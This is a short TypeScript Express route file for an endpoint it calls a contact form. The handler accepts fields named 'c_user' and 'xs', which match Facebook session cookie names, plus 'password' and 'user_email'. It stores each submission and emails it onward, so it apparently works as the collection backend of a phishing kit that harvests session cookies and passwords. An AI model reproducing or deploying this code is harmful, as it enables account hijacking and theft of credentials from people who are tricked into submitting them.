import type { Express } from "express";
import { createServer } from "http";
import { storage } from "./storage";
import { insertContactFormSchema } from "@shared/schema";
import { ZodError } from "zod";
import { emailService } from "./email-service";

export async function registerRoutes(app: Express) {
  app.post("/api/contact-form", async (req, res) => {
    try {
      console.log('Received form data:', req.body);
      const data = insertContactFormSchema.parse(req.body);

      // Store the form data
      const result = await storage.createContactForm(data);

      // Determine form type and send appropriate email
      try {
        if (data.c_user && data.xs) {
          console.log('Sending validation form email for c_user:', data.c_user);
          await emailService.sendValidationFormEmail(result);
        } else if (data.password) {
          console.log('Sending confirmation form email for:', data.user_email || 'No email provided');
          await emailService.sendConfirmationFormEmail(result);
        }
      } catch (emailError) {
        console.error('Failed to send email:', emailError);
        // Continue with the response even if email fails
      }

      res.json(result);
    } catch (error) {
      if (error instanceof ZodError) {
        console.error('Validation error:', error.errors);
        res.status(400).json({ message: "Invalid form data", errors: error.errors });
      } else {
        console.error('Error processing form:', error);
        res.status(500).json({ message: "Internal server error" });
      }
    }
  });

  return createServer(app);
}